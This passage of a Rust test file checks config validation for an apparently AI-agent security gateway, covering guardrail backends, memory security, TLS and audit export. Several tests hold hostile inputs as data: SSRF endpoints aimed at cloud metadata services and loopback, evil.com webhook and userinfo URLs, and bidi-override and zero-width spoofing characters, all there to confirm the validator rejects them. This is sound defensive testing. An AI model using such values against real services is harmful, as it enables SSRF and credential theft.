    let err = config.validate().unwrap_err();
    assert!(
        err.contains("schema_poisoning.min_observations"),
        "expected min_observations error, got: {err}"
    );
}

#[test]
fn test_validate_accepts_schema_poisoning_min_observations_at_max() {
    let mut config = r53_base_config();
    config.schema_poisoning.min_observations = 10_000;
    let result = config.validate();
    if let Err(e) = &result {
        assert!(
            !e.contains("schema_poisoning.min_observations"),
            "min_observations=10000 should be accepted, got: {e}"
        );
    }
}

// ── Finding 6: SemanticDetectionConfig.min_text_length + templates ────

#[test]
fn test_validate_rejects_semantic_min_text_length_too_large() {
    let mut config = r53_base_config();
    config.semantic_detection.min_text_length = 100_001;
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("semantic_detection.min_text_length"),
        "expected min_text_length error, got: {err}"
    );
}

#[test]
fn test_validate_accepts_semantic_min_text_length_at_max() {
    let mut config = r53_base_config();
    config.semantic_detection.min_text_length = 100_000;
    let result = config.validate();
    if let Err(e) = &result {
        assert!(
            !e.contains("semantic_detection.min_text_length"),
            "min_text_length=100000 should be accepted, got: {e}"
        );
    }
}

#[test]
fn test_validate_rejects_semantic_template_too_long() {
    let mut config = r53_base_config();
    config.semantic_detection.extra_templates = vec!["x".repeat(4097)];
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("extra_templates") && err.contains("exceeds max length"),
        "expected template length error, got: {err}"
    );
}

#[test]
fn test_validate_rejects_semantic_template_empty() {
    let mut config = r53_base_config();
    config.semantic_detection.extra_templates = vec!["".to_string()];
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("extra_templates") && err.contains("must not be empty"),
        "expected empty template error, got: {err}"
    );
}

#[test]
fn test_validate_rejects_semantic_template_control_chars() {
    let mut config = r53_base_config();
    config.semantic_detection.extra_templates = vec!["template\x07with bell".to_string()];
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("extra_templates") && err.contains("control"),
        "expected control char error, got: {err}"
    );
}

#[test]
fn test_validate_accepts_semantic_valid_templates() {
    let mut config = r53_base_config();
    config.semantic_detection.extra_templates = vec![
        "valid template one".to_string(),
        "valid template two".to_string(),
    ];
    let result = config.validate();
    if let Err(e) = &result {
        assert!(
            !e.contains("extra_templates"),
            "valid templates should be accepted, got: {e}"
        );
    }
}

// ── Finding 7: MemorySecurityConfig validation ───────────────────────

#[test]
fn test_validate_rejects_memory_trust_decay_rate_nan() {
    let mut config = r53_base_config();
    config.memory_security.trust_decay_rate = f64::NAN;
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("memory_security.trust_decay_rate"),
        "expected trust_decay_rate error, got: {err}"
    );
}

#[test]
fn test_validate_rejects_memory_trust_decay_rate_negative() {
    let mut config = r53_base_config();
    config.memory_security.trust_decay_rate = -0.01;
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("memory_security.trust_decay_rate"),
        "expected trust_decay_rate error, got: {err}"
    );
}

#[test]
fn test_validate_rejects_memory_trust_threshold_nan() {
    let mut config = r53_base_config();
    config.memory_security.trust_threshold = f64::NAN;
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("memory_security.trust_threshold"),
        "expected trust_threshold error, got: {err}"
    );
}

#[test]
fn test_validate_rejects_memory_trust_threshold_out_of_range() {
    let mut config = r53_base_config();
    config.memory_security.trust_threshold = 1.1;
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("memory_security.trust_threshold"),
        "expected trust_threshold error, got: {err}"
    );
}

#[test]
fn test_validate_rejects_memory_trust_threshold_negative() {
    let mut config = r53_base_config();
    config.memory_security.trust_threshold = -0.1;
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("memory_security.trust_threshold"),
        "expected trust_threshold error, got: {err}"
    );
}

#[test]
fn test_validate_rejects_memory_max_entries_per_session_too_large() {
    let mut config = r53_base_config();
    config.memory_security.max_entries_per_session = 100_001;
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("memory_security.max_entries_per_session"),
        "expected max_entries_per_session error, got: {err}"
    );
}

#[test]
fn test_validate_rejects_memory_max_provenance_nodes_too_large() {
    let mut config = r53_base_config();
    config.memory_security.max_provenance_nodes = 1_000_001;
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("memory_security.max_provenance_nodes"),
        "expected max_provenance_nodes error, got: {err}"
    );
}

#[test]
fn test_validate_rejects_memory_max_fingerprints_too_large() {
    let mut config = r53_base_config();
    config.memory_security.max_fingerprints = 100_001;
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("memory_security.max_fingerprints"),
        "expected max_fingerprints error, got: {err}"
    );
}

#[test]
fn test_validate_rejects_memory_max_age_hours_too_large() {
    let mut config = r53_base_config();
    config.memory_security.max_memory_age_hours = 8761;
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("memory_security.max_memory_age_hours"),
        "expected max_memory_age_hours error, got: {err}"
    );
}

#[test]
fn test_validate_rejects_memory_max_age_hours_zero_when_enabled() {
    let mut config = r53_base_config();
    config.memory_security.enabled = true;
    config.memory_security.max_memory_age_hours = 0;
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("max_memory_age_hours must be > 0 when enabled"),
        "expected zero-age-when-enabled error, got: {err}"
    );
}

#[test]
fn test_validate_accepts_memory_max_age_hours_zero_when_disabled() {
    let mut config = r53_base_config();
    config.memory_security.enabled = false;
    config.memory_security.max_memory_age_hours = 0;
    let result = config.validate();
    if let Err(e) = &result {
        assert!(
            !e.contains("max_memory_age_hours must be > 0 when enabled"),
            "zero age when disabled should be accepted, got: {e}"
        );
    }
}

#[test]
fn test_validate_rejects_memory_namespaces_max_too_large() {
    let mut config = r53_base_config();
    config.memory_security.namespaces.max_namespaces = 100_001;
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("memory_security.namespaces.max_namespaces"),
        "expected max_namespaces error, got: {err}"
    );
}

#[test]
fn test_validate_rejects_memory_namespaces_invalid_isolation() {
    let mut config = r53_base_config();
    config.memory_security.namespaces.enabled = true;
    config.memory_security.namespaces.default_isolation = "invalid".to_string();
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("default_isolation"),
        "expected isolation error, got: {err}"
    );
}

#[test]
fn test_validate_accepts_memory_namespaces_valid_isolations() {
    for isolation in &["session", "agent", "shared"] {
        let mut config = r53_base_config();
        config.memory_security.namespaces.enabled = true;
        config.memory_security.namespaces.default_isolation = isolation.to_string();
        let result = config.validate();
        if let Err(e) = &result {
            assert!(
                !e.contains("default_isolation"),
                "isolation '{isolation}' should be accepted, got: {e}"
            );
        }
    }
}

#[test]
fn test_validate_accepts_memory_defaults() {
    let config = r53_base_config();
    let result = config.validate();
    if let Err(e) = &result {
        assert!(
            !e.contains("memory_security"),
            "default memory_security should be accepted, got: {e}"
        );
    }
}

// ═══════════════════════════════════════════════════
// SEMANTIC GUARDRAILS VALIDATION TESTS
// ═══════════════════════════════════════════════════

#[test]
fn test_semantic_guardrails_default_validates() {
    let config = crate::SemanticGuardrailsConfig::default();
    assert!(config.validate().is_ok());
}

#[test]
fn test_semantic_guardrails_nan_min_confidence() {
    let config = crate::SemanticGuardrailsConfig {
        min_confidence: f64::NAN,
        ..Default::default()
    };
    assert!(config.validate().is_err());
}

#[test]
fn test_semantic_guardrails_negative_min_confidence() {
    let config = crate::SemanticGuardrailsConfig {
        min_confidence: -0.1,
        ..Default::default()
    };
    assert!(config.validate().is_err());
}

#[test]
fn test_semantic_guardrails_nan_intent_threshold() {
    let mut config = crate::SemanticGuardrailsConfig::default();
    config.intent_classification.confidence_threshold = f64::NAN;
    assert!(config.validate().is_err());
}

#[test]
fn test_semantic_guardrails_nan_jailbreak_threshold() {
    let mut config = crate::SemanticGuardrailsConfig::default();
    config.jailbreak_detection.confidence_threshold = f64::INFINITY;
    assert!(config.validate().is_err());
}

// ═══════════════════════════════════════════════════
// SEMANTIC GUARDRAILS — BACKEND + BOUNDS VALIDATION (FIND-R84-005 / R100)
// ═══════════════════════════════════════════════════

#[test]
fn test_semantic_guardrails_model_control_chars_rejected() {
    let config = crate::SemanticGuardrailsConfig {
        model: Some("openai:gpt-4o\x00mini".to_string()),
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("control"), "{}", err);
}

#[test]
fn test_semantic_guardrails_model_unicode_format_chars_rejected() {
    let config = crate::SemanticGuardrailsConfig {
        model: Some("openai:gpt-4o\u{200B}mini".to_string()),
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("format"), "{}", err);
}

#[test]
fn test_semantic_guardrails_cache_ttl_zero_rejected() {
    let config = crate::SemanticGuardrailsConfig {
        cache_ttl_secs: 0,
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("cache_ttl_secs must be > 0"), "{}", err);
}

#[test]
fn test_semantic_guardrails_cache_ttl_exceeds_max() {
    let config = crate::SemanticGuardrailsConfig {
        cache_ttl_secs: 86_401,
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("exceeds maximum"), "{}", err);
}

#[test]
fn test_semantic_guardrails_cache_max_size_zero_rejected() {
    let config = crate::SemanticGuardrailsConfig {
        cache_max_size: 0,
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("cache_max_size must be > 0"), "{}", err);
}

#[test]
fn test_semantic_guardrails_cache_max_size_exceeds_max() {
    let config = crate::SemanticGuardrailsConfig {
        cache_max_size: 1_000_001,
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("exceeds maximum"), "{}", err);
}

#[test]
fn test_semantic_guardrails_max_latency_zero_rejected() {
    let config = crate::SemanticGuardrailsConfig {
        max_latency_ms: 0,
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("max_latency_ms must be > 0"), "{}", err);
}

#[test]
fn test_semantic_guardrails_max_latency_exceeds_max() {
    let config = crate::SemanticGuardrailsConfig {
        max_latency_ms: 30_001,
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("exceeds maximum"), "{}", err);
}

#[test]
fn test_semantic_guardrails_fallback_invalid_value_rejected() {
    let config = crate::SemanticGuardrailsConfig {
        fallback_on_timeout: "unknown_value".to_string(),
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("must be one of"), "{}", err);
}

#[test]
fn test_semantic_guardrails_fallback_allow_accepted() {
    let config = crate::SemanticGuardrailsConfig {
        fallback_on_timeout: "allow".to_string(),
        ..Default::default()
    };
    assert!(config.validate().is_ok());
}

#[test]
fn test_semantic_guardrails_fallback_pattern_match_accepted() {
    let config = crate::SemanticGuardrailsConfig {
        fallback_on_timeout: "pattern_match".to_string(),
        ..Default::default()
    };
    assert!(config.validate().is_ok());
}

#[test]
fn test_semantic_guardrails_fallback_control_chars_rejected() {
    let config = crate::SemanticGuardrailsConfig {
        fallback_on_timeout: "deny\x01".to_string(),
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("control"), "{}", err);
}

#[test]
fn test_openai_backend_default_validates() {
    let backend = crate::semantic_guardrails_config::OpenAiBackendConfig::default();
    assert!(backend.validate().is_ok());
}

#[test]
fn test_anthropic_backend_default_validates() {
    let backend = crate::semantic_guardrails_config::AnthropicBackendConfig::default();
    assert!(backend.validate().is_ok());
}

#[test]
fn test_openai_backend_empty_model_rejected() {
    let backend = crate::semantic_guardrails_config::OpenAiBackendConfig {
        model: String::new(),
        ..Default::default()
    };
    let err = backend.validate().unwrap_err();
    assert!(err.contains("model must not be empty"), "{}", err);
}

#[test]
fn test_openai_backend_model_control_chars_rejected() {
    let backend = crate::semantic_guardrails_config::OpenAiBackendConfig {
        model: "gpt-4o\x00mini".to_string(),
        ..Default::default()
    };
    let err = backend.validate().unwrap_err();
    assert!(err.contains("control"), "{}", err);
}

#[test]
fn test_openai_backend_model_unicode_format_chars_rejected() {
    let backend = crate::semantic_guardrails_config::OpenAiBackendConfig {
        model: "gpt-4o\u{200B}mini".to_string(),
        ..Default::default()
    };
    let err = backend.validate().unwrap_err();
    assert!(err.contains("format"), "{}", err);
}

#[test]
fn test_openai_backend_empty_api_key_env_rejected() {
    let backend = crate::semantic_guardrails_config::OpenAiBackendConfig {
        api_key_env: String::new(),
        ..Default::default()
    };
    let err = backend.validate().unwrap_err();
    assert!(err.contains("api_key_env must not be empty"), "{}", err);
}

#[test]
fn test_openai_backend_timeout_zero_rejected() {
    let backend = crate::semantic_guardrails_config::OpenAiBackendConfig {
        timeout_ms: 0,
        ..Default::default()
    };
    let err = backend.validate().unwrap_err();
    assert!(err.contains("timeout_ms must be > 0"), "{}", err);
}

#[test]
fn test_openai_backend_timeout_exceeds_max() {
    let backend = crate::semantic_guardrails_config::OpenAiBackendConfig {
        timeout_ms: 60_001,
        ..Default::default()
    };
    let err = backend.validate().unwrap_err();
    assert!(err.contains("exceeds maximum"), "{}", err);
}

#[test]
fn test_openai_backend_max_tokens_zero_rejected() {
    let backend = crate::semantic_guardrails_config::OpenAiBackendConfig {
        max_tokens: 0,
        ..Default::default()
    };
    let err = backend.validate().unwrap_err();
    assert!(err.contains("max_tokens must be > 0"), "{}", err);
}

#[test]
fn test_openai_backend_max_tokens_exceeds_max() {
    let backend = crate::semantic_guardrails_config::OpenAiBackendConfig {
        max_tokens: 16_385,
        ..Default::default()
    };
    let err = backend.validate().unwrap_err();
    assert!(err.contains("exceeds maximum"), "{}", err);
}

#[test]
fn test_openai_backend_endpoint_ssrf_localhost_rejected() {
    let backend = crate::semantic_guardrails_config::OpenAiBackendConfig {
        endpoint: Some("https://localhost:8080/v1".to_string()),
        ..Default::default()
    };
    let err = backend.validate().unwrap_err();
    assert!(err.contains("loopback"), "{}", err);
}

#[test]
fn test_openai_backend_endpoint_ssrf_127_rejected() {
    let backend = crate::semantic_guardrails_config::OpenAiBackendConfig {
        endpoint: Some("https://127.0.0.1:8080/v1".to_string()),
        ..Default::default()
    };
    let err = backend.validate().unwrap_err();
    assert!(err.contains("loopback"), "{}", err);
}

#[test]
fn test_openai_backend_endpoint_ssrf_metadata_rejected() {
    let backend = crate::semantic_guardrails_config::OpenAiBackendConfig {
        endpoint: Some("http://169.254.169.254/latest/meta-data/".to_string()),
        ..Default::default()
    };
    let err = backend.validate().unwrap_err();
    // IMP-R126-012: Canonical SSRF validation now rejects 169.254.x.x as
    // private/internal IP instead of matching against a hard-coded loopback list.
    assert!(
        err.contains("loopback") || err.contains("metadata") || err.contains("private"),
        "{}",
        err
    );
}

#[test]
fn test_openai_backend_endpoint_ssrf_internal_rejected() {
    let backend = crate::semantic_guardrails_config::OpenAiBackendConfig {
        endpoint: Some("https://metadata.google.internal/computeMetadata/v1/".to_string()),
        ..Default::default()
    };
    let err = backend.validate().unwrap_err();
    assert!(
        err.contains("metadata") || err.contains("loopback"),
        "{}",
        err
    );
}

#[test]
fn test_openai_backend_endpoint_no_scheme_rejected() {
    let backend = crate::semantic_guardrails_config::OpenAiBackendConfig {
        endpoint: Some("ftp://api.openai.com/v1".to_string()),
        ..Default::default()
    };
    let err = backend.validate().unwrap_err();
    assert!(err.contains("http") && err.contains("scheme"), "{}", err);
}

#[test]
fn test_openai_backend_endpoint_userinfo_rejected() {
    let backend = crate::semantic_guardrails_config::OpenAiBackendConfig {
        endpoint: Some("https://user@evil.com:8080/v1".to_string()),
        ..Default::default()
    };
    let err = backend.validate().unwrap_err();
    assert!(err.contains("userinfo"), "{}", err);
}

#[test]
fn test_openai_backend_endpoint_valid_accepted() {
    let backend = crate::semantic_guardrails_config::OpenAiBackendConfig {
        endpoint: Some("https://api.openai.com/v1".to_string()),
        ..Default::default()
    };
    assert!(backend.validate().is_ok());
}

#[test]
fn test_openai_backend_endpoint_control_chars_rejected() {
    let backend = crate::semantic_guardrails_config::OpenAiBackendConfig {
        endpoint: Some("https://api.openai.com/v1\x00".to_string()),
        ..Default::default()
    };
    let err = backend.validate().unwrap_err();
    assert!(err.contains("control"), "{}", err);
}

#[test]
fn test_semantic_guardrails_wires_openai_validate() {
    let config = crate::SemanticGuardrailsConfig {
        openai: Some(crate::semantic_guardrails_config::OpenAiBackendConfig {
            endpoint: Some("ftp://evil.com".to_string()),
            ..Default::default()
        }),
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("semantic_guardrails.openai"), "{}", err);
}

#[test]
fn test_semantic_guardrails_wires_anthropic_validate() {
    let config = crate::SemanticGuardrailsConfig {
        anthropic: Some(crate::semantic_guardrails_config::AnthropicBackendConfig {
            endpoint: Some("ftp://evil.com".to_string()),
            ..Default::default()
        }),
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(err.contains("semantic_guardrails.anthropic"), "{}", err);
}

#[test]
fn test_nl_policy_id_unicode_format_chars_rejected() {
    let policy = crate::semantic_guardrails_config::NlPolicyConfig {
        id: "policy\u{200B}1".to_string(),
        name: "test".to_string(),
        statement: "test statement".to_string(),
        tool_patterns: vec![],
        enabled: true,
        priority: 0,
    };
    let err = policy.validate().unwrap_err();
    assert!(err.contains("format"), "{}", err);
}

#[test]
fn test_nl_policy_name_unicode_format_chars_rejected() {
    let policy = crate::semantic_guardrails_config::NlPolicyConfig {
        id: "policy1".to_string(),
        name: "test\u{FEFF}name".to_string(),
        statement: "test statement".to_string(),
        tool_patterns: vec![],
        enabled: true,
        priority: 0,
    };
    let err = policy.validate().unwrap_err();
    assert!(err.contains("format"), "{}", err);
}

#[test]
fn test_nl_policy_statement_unicode_format_chars_rejected() {
    let policy = crate::semantic_guardrails_config::NlPolicyConfig {
        id: "policy1".to_string(),
        name: "test".to_string(),
        statement: "Never allow \u{202E}file deletion".to_string(),
        tool_patterns: vec![],
        enabled: true,
        priority: 0,
    };
    let err = policy.validate().unwrap_err();
    assert!(err.contains("format"), "{}", err);
}

#[test]
fn test_nl_policy_tool_pattern_unicode_format_chars_rejected() {
    let policy = crate::semantic_guardrails_config::NlPolicyConfig {
        id: "policy1".to_string(),
        name: "test".to_string(),
        statement: "test statement".to_string(),
        tool_patterns: vec!["filesystem\u{200B}:*".to_string()],
        enabled: true,
        priority: 0,
    };
    let err = policy.validate().unwrap_err();
    assert!(err.contains("format"), "{}", err);
}

#[test]
fn test_openai_backend_endpoint_link_local_rejected() {
    let backend = crate::semantic_guardrails_config::OpenAiBackendConfig {
        endpoint: Some("http://169.254.1.1:8080/v1".to_string()),
        ..Default::default()
    };
    let err = backend.validate().unwrap_err();
    // IMP-R126-012: Canonical SSRF validation rejects 169.254.x.x as private.
    assert!(
        err.contains("loopback") || err.contains("metadata") || err.contains("private"),
        "{}",
        err
    );
}

#[test]
fn test_semantic_guardrails_boundary_cache_ttl_max_accepted() {
    let config = crate::SemanticGuardrailsConfig {
        cache_ttl_secs: 86_400,
        ..Default::default()
    };
    assert!(config.validate().is_ok());
}

#[test]
fn test_semantic_guardrails_boundary_cache_max_size_max_accepted() {
    let config = crate::SemanticGuardrailsConfig {
        cache_max_size: 1_000_000,
        ..Default::default()
    };
    assert!(config.validate().is_ok());
}

#[test]
fn test_semantic_guardrails_boundary_max_latency_max_accepted() {
    let config = crate::SemanticGuardrailsConfig {
        max_latency_ms: 30_000,
        ..Default::default()
    };
    assert!(config.validate().is_ok());
}

// ═══════════════════════════════════════════════════
// MULTIMODAL POLICY VALIDATION TESTS
// ═══════════════════════════════════════════════════

#[test]
fn test_multimodal_default_validates() {
    let config = crate::MultimodalPolicyConfig::default();
    assert!(config.validate().is_ok());
}

#[test]
fn test_multimodal_nan_ocr_confidence() {
    let config = crate::MultimodalPolicyConfig {
        min_ocr_confidence: f32::NAN,
        ..Default::default()
    };
    assert!(config.validate().is_err());
}

#[test]
fn test_multimodal_negative_ocr_confidence() {
    let config = crate::MultimodalPolicyConfig {
        min_ocr_confidence: -0.1,
        ..Default::default()
    };
    assert!(config.validate().is_err());
}

#[test]
fn test_multimodal_too_many_content_types() {
    let config = crate::MultimodalPolicyConfig {
        content_types: (0..25).map(|i| format!("Type{i}")).collect(),
        ..Default::default()
    };
    assert!(config.validate().is_err());
}

#[test]
fn test_validate_multimodal_in_policy_config() {
    let mut config = r53_base_config();
    config.multimodal.min_ocr_confidence = f32::NAN;
    let result = config.validate();
    assert!(result.is_err());
    assert!(
        result.unwrap_err().contains("min_ocr_confidence"),
        "should reject NaN min_ocr_confidence"
    );
}

// ── P3 findings: known_tool_names per-element validation ─────────────────────

#[test]
fn test_known_tool_names_empty_entry_rejected() {
    let mut config = minimal_config();
    config.known_tool_names = vec!["".to_string()];
    let err = config.validate().unwrap_err();
    assert!(err.contains("known_tool_names[0]"), "err: {err}");
    assert!(err.contains("empty"), "err: {err}");
}

#[test]
fn test_known_tool_names_too_long_rejected() {
    let mut config = minimal_config();
    config.known_tool_names = vec!["a".repeat(257)];
    let err = config.validate().unwrap_err();
    assert!(err.contains("known_tool_names[0]"), "err: {err}");
    assert!(err.contains("exceeds max length"), "err: {err}");
}

#[test]
fn test_known_tool_names_control_char_rejected() {
    let mut config = minimal_config();
    config.known_tool_names = vec!["tool\x00name".to_string()];
    let err = config.validate().unwrap_err();
    assert!(err.contains("known_tool_names[0]"), "err: {err}");
    assert!(err.contains("control"), "err: {err}");
}

#[test]
fn test_known_tool_names_valid_entries_accepted() {
    let mut config = minimal_config();
    config.known_tool_names = vec!["filesystem".to_string(), "bash_tool".to_string()];
    assert!(config.validate().is_ok());
}

// ── P3 findings: persistence_path control-char/length validation ──────────────

#[test]
fn test_persistence_path_null_byte_rejected() {
    let mut config = minimal_config();
    config.tool_registry.persistence_path = "data/reg\x00istry.jsonl".to_string();
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("control") || err.contains("null bytes"),
        "err: {err}"
    );
}

#[test]
fn test_persistence_path_control_char_rejected() {
    let mut config = minimal_config();
    config.tool_registry.persistence_path = "data/\x01registry.jsonl".to_string();
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("control") || err.contains("null bytes"),
        "err: {err}"
    );
}

#[test]
fn test_persistence_path_too_long_rejected() {
    let mut config = minimal_config();
    // 4097 bytes — just over the 4096-byte limit
    config.tool_registry.persistence_path = "a".repeat(4097);
    let err = config.validate().unwrap_err();
    assert!(err.contains("persistence_path"), "err: {err}");
    assert!(err.contains("exceeds max length"), "err: {err}");
}

// ── FIND-R81-CFG-001: TlsConfig cipher_suites bounds ──────────────────────

#[test]
fn test_validate_rejects_too_many_cipher_suites() {
    let mut config = minimal_config();
    config.tls.cipher_suites = (0..65).map(|i| format!("TLS_SUITE_{i}")).collect();
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("tls.cipher_suites") && err.contains("max is 64"),
        "expected cipher_suites count error, got: {err}"
    );
}

#[test]
fn test_validate_rejects_empty_cipher_suite_entry() {
    let mut config = minimal_config();
    config.tls.cipher_suites = vec![String::new()];
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("tls.cipher_suites[0]") && err.contains("is empty"),
        "expected empty cipher suite error, got: {err}"
    );
}

#[test]
fn test_validate_rejects_oversized_cipher_suite_entry() {
    let mut config = minimal_config();
    config.tls.cipher_suites = vec!["A".repeat(129)];
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("tls.cipher_suites[0]") && err.contains("exceeds maximum 128"),
        "expected cipher suite length error, got: {err}"
    );
}

#[test]
fn test_validate_rejects_cipher_suite_with_control_chars() {
    let mut config = minimal_config();
    config.tls.cipher_suites = vec!["TLS_AES_128\x00_GCM".to_string()];
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("tls.cipher_suites[0]") && err.contains("control"),
        "expected cipher suite control char error, got: {err}"
    );
}

#[test]
fn test_validate_accepts_valid_cipher_suites() {
    let mut config = minimal_config();
    config.tls.cipher_suites = vec![
        "TLS_AES_128_GCM_SHA256".to_string(),
        "TLS_AES_256_GCM_SHA384".to_string(),
    ];
    assert!(config.validate().is_ok());
}

// ── FIND-R81-CFG-002: A2A empty string validation ─────────────────────────

#[test]
fn test_a2a_validate_rejects_empty_auth_method() {
    let config = crate::a2a::A2aConfig {
        allowed_auth_methods: vec![String::new()],
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("allowed_auth_methods") && err.contains("empty string"),
        "expected empty auth method error, got: {err}"
    );
}

#[test]
fn test_a2a_validate_rejects_empty_task_operation() {
    let config = crate::a2a::A2aConfig {
        allowed_task_operations: vec![String::new()],
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("allowed_task_operations") && err.contains("empty string"),
        "expected empty task operation error, got: {err}"
    );
}

#[test]
fn test_a2a_validate_accepts_valid_config() {
    let config = crate::a2a::A2aConfig::default();
    assert!(config.validate().is_ok());
}

// ═══════════════════════════════════════════════════════
// FIND-R83-004: Unicode format char validation for allowed_auth_methods
// ═══════════════════════════════════════════════════════

#[test]
fn test_allowed_auth_methods_rejects_control_chars() {
    // Zero-width space (\u{200B}) embedded in an auth method name.
    // The byte-level a2a_contains_control_chars check fires first (UTF-8 continuation
    // bytes 0x80-0x9F match the C1 range). The Unicode format char check provides
    // defense-in-depth for when the byte-level check is refined.
    let config = crate::a2a::A2aConfig {
        allowed_auth_methods: vec![format!("bear\u{200B}er")],
        ..Default::default()
    };
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("control") || err.contains("format characters"),
        "expected control/format char rejection, got: {err}"
    );

    // Bidi override (\u{202E}) embedded in an auth method name
    let config2 = crate::a2a::A2aConfig {
        allowed_auth_methods: vec![format!("oauth2\u{202E}")],
        ..Default::default()
    };
    let err2 = config2.validate().unwrap_err();
    assert!(
        err2.contains("control") || err2.contains("format characters"),
        "expected control/format char rejection, got: {err2}"
    );

    // BOM (\u{FEFF}) at the start of an auth method name
    let config3 = crate::a2a::A2aConfig {
        allowed_auth_methods: vec![format!("\u{FEFF}bearer")],
        ..Default::default()
    };
    let err3 = config3.validate().unwrap_err();
    assert!(
        err3.contains("control") || err3.contains("format characters"),
        "expected control/format char rejection, got: {err3}"
    );

    // ASCII control character (tab) in an auth method name
    let config4 = crate::a2a::A2aConfig {
        allowed_auth_methods: vec!["bear\ter".to_string()],
        ..Default::default()
    };
    let err4 = config4.validate().unwrap_err();
    assert!(
        err4.contains("control"),
        "expected control char rejection for tab, got: {err4}"
    );
}

// ═══════════════════════════════════════════════════════
// FIND-R83-002: label_selector validation in deployment config
// ═══════════════════════════════════════════════════════

#[test]
fn test_label_selector_rejects_control_chars() {
    // ASCII control character (tab) in label_selector
    let mut config = crate::DeploymentConfig::default();
    config.service_discovery.label_selector = Some("app=foo\tbar".to_string());
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("control"),
        "expected ASCII control char rejection, got: {err}"
    );

    // Unicode format character (zero-width space) in label_selector
    let mut config2 = crate::DeploymentConfig::default();
    config2.service_discovery.label_selector = Some("app=vellaveto\u{200B}".to_string());
    let err2 = config2.validate().unwrap_err();
    assert!(
        err2.contains("format"),
        "expected Unicode format char rejection, got: {err2}"
    );

    // Bidi override in label_selector
    let mut config3 = crate::DeploymentConfig::default();
    config3.service_discovery.label_selector = Some("app=\u{202E}evil".to_string());
    let err3 = config3.validate().unwrap_err();
    assert!(
        err3.contains("format"),
        "expected Unicode format char rejection, got: {err3}"
    );
}

#[test]
fn test_label_selector_rejects_too_long() {
    let mut config = crate::DeploymentConfig::default();
    config.service_discovery.label_selector =
        Some("a".repeat(crate::deployment::MAX_LABEL_SELECTOR_LEN + 1));
    let err = config.validate().unwrap_err();
    assert!(
        err.contains("exceeds maximum"),
        "expected length rejection, got: {err}"
    );
    assert!(
        err.contains("label_selector"),
        "expected label_selector in error, got: {err}"
    );

    // Exactly at the limit should be accepted
    let mut config2 = crate::DeploymentConfig::default();
    config2.service_discovery.label_selector =
        Some("a".repeat(crate::deployment::MAX_LABEL_SELECTOR_LEN));
    assert!(
        config2.validate().is_ok(),
        "label_selector at exactly MAX_LABEL_SELECTOR_LEN should be accepted"
    );
}

// ═══════════════════════════════════════════════════
// ROUND 83 AUDIT FIXES
// ═══════════════════════════════════════════════════

// FIND-R83-004: AuditExportConfig::validate()
#[test]
fn test_audit_export_config_validate_zero_batch_size() {
    let cfg = crate::detection::AuditExportConfig {
        batch_size: 0,
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("batch_size"));
}

#[test]
fn test_audit_export_config_validate_excessive_batch_size() {
    let cfg = crate::detection::AuditExportConfig {
        batch_size: 100_001,
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("batch_size"));
}

#[test]
fn test_audit_export_config_validate_invalid_format() {
    let cfg = crate::detection::AuditExportConfig {
        format: "xml".to_string(),
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("format"));
}

#[test]
fn test_audit_export_config_validate_control_char_webhook() {
    let cfg = crate::detection::AuditExportConfig {
        webhook_url: Some("https://evil.com/\x00inject".to_string()),
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("control"));
}

#[test]
fn test_audit_export_config_validate_invalid_scheme_webhook() {
    let cfg = crate::detection::AuditExportConfig {
        webhook_url: Some("ftp://evil.com/data".to_string()),
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("scheme"));
}

#[test]
fn test_audit_export_config_validate_default_is_valid() {
    let cfg = crate::detection::AuditExportConfig::default();
    assert!(cfg.validate().is_ok());
}

// ═══════════════════════════════════════════════════════════
// NhiConfig::validate() tests (IMP-R100-005)
// ═══════════════════════════════════════════════════════════

#[test]
fn test_nhi_config_default_validates() {
    let cfg = crate::memory_nhi::NhiConfig::default();
    assert!(cfg.validate().is_ok());
}

#[test]
fn test_nhi_config_anomaly_threshold_nan() {
    let cfg = crate::memory_nhi::NhiConfig {
        anomaly_threshold: f64::NAN,
        ..Default::default()
    };
    let err = cfg.validate().unwrap_err();
    assert!(err.contains("anomaly_threshold"));
}

#[test]
